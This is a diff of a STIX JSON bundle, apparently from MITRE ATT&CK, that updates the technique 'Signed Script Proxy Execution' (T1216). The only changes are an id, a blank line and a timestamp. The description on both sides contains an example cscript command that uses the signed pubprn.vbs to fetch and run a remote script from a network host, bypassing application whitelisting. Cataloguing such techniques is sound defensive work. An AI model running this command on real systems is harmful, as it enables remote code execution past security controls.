@@ -1,13 +1,13 @@
 {
     "type": "bundle",
-    "id": "bundle--8809f552-7dfb-4b10-9b0b-f8dc8152b85b",
+    "id": "bundle--60e17c6d-c832-4365-8b4b-4c1ae525dfb5",
     "spec_version": "2.0",
     "objects": [
         {
             "id": "attack-pattern--f6fe9070-7a65-49ea-ae72-76292f42cebe",
             "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
             "name": "Signed Script Proxy Execution",
-            "description": "Scripts signed with trusted certificates can be used to proxy execution of malicious files. This behavior may bypass signature validation restrictions and application whitelisting solutions that do not account for use of these scripts.\n\nPubPrn.vbs is signed by Microsoft and can be used to proxy execution from a remote site. (Citation: Enigma0x3 PubPrn Bypass) Example command: <code>cscript C:\\Windows\\System32\\Printing_Admin_Scripts\\en-US\\pubprn.vbs 127.0.0.1 script:http[:]//192.168.1.100/hi.png</code>\n\n\nThere are several other signed scripts that may be used in a similar manner. (Citation: GitHub Ultimate AppLocker Bypass List)",
+            "description": "Scripts signed with trusted certificates can be used to proxy execution of malicious files. This behavior may bypass signature validation restrictions and application whitelisting solutions that do not account for use of these scripts.\n\nPubPrn.vbs is signed by Microsoft and can be used to proxy execution from a remote site. (Citation: Enigma0x3 PubPrn Bypass) Example command: <code>cscript C:\\Windows\\System32\\Printing_Admin_Scripts\\en-US\\pubprn.vbs 127.0.0.1 script:http[:]//192.168.1.100/hi.png</code>\n\nThere are several other signed scripts that may be used in a similar manner. (Citation: GitHub Ultimate AppLocker Bypass List)",
             "external_references": [
                 {
                     "external_id": "T1216",
@@ -58,7 +58,7 @@
                     "kill_chain_name": "mitre-attack"
                 }
             ],
-            "modified": "2018-08-16T16:59:54.597Z",
+            "modified": "2018-09-07T16:42:18.771Z",
             "created": "2018-04-18T17:59:24.739Z"
         }
     ]
